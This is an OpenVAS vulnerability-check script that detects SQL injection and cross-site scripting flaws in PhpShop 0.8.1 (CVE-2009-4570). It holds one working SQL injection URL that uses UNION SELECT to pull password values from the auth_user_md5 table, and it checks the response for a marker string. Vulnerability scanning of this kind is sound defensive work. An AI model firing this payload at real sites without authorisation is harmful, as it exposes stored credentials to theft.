###############################################################################
# OpenVAS Vulnerability Test
#
# PhpShop Cross-Site Scripting and SQL Injection Vulnerabilities
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100383");
  script_version("2019-05-13T14:05:09+0000");
  script_tag(name:"last_modification", value:"2019-05-13 14:05:09 +0000 (Mon, 13 May 2019)");
  script_tag(name:"creation_date", value:"2009-12-08 22:02:24 +0100 (Tue, 08 Dec 2009)");
  script_cve_id("CVE-2009-4570");
  script_bugtraq_id(37227);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");

  script_name("PhpShop Cross-Site Scripting and SQL Injection Vulnerabilities");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/37227");
  script_xref(name:"URL", value:"http://www.phpshop.org/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/508243");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("phpshop_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("phpshop/detected");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"summary", value:"PhpShop is prone to a cross-site scripting vulnerability and multiple
  SQL-injection vulnerabilities because it fails to adequately sanitize user-supplied input.");

  script_tag(name:"impact", value:"Exploiting these issues could allow an attacker to steal cookie-
  based authentication credentials, compromise the application, access or modify data, or exploit
  latent vulnerabilities in the underlying database.");

  script_tag(name:"affected", value:"PhpShop 0.8.1 is vulnerable, other versions may also be affected.");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");

port = get_http_port(default:80);
if(!version = get_kb_item(string("www/", port, "/phpshop")))exit(0);
if(!matches = eregmatch(string:version, pattern:"^(.+) under (/.*)$"))exit(0);

dir = matches[2];
if(isnull(dir))exit(0);

url = string(dir,"/?page=shop/flypage&product_id=1011%27/**/union/**/select/**/1,1,1,1,1,password,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0x53514c2d496e6a656374696f6e2d54657374/**/from/**/auth_user_md5--%20aaa");
req = http_get(item:url, port:port);
buf = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
if( buf == NULL )exit(0);

if(egrep(pattern: "SQL-Injection-Test", string: buf)) {
  security_message(port:port);
  exit(0);
}

exit(0);
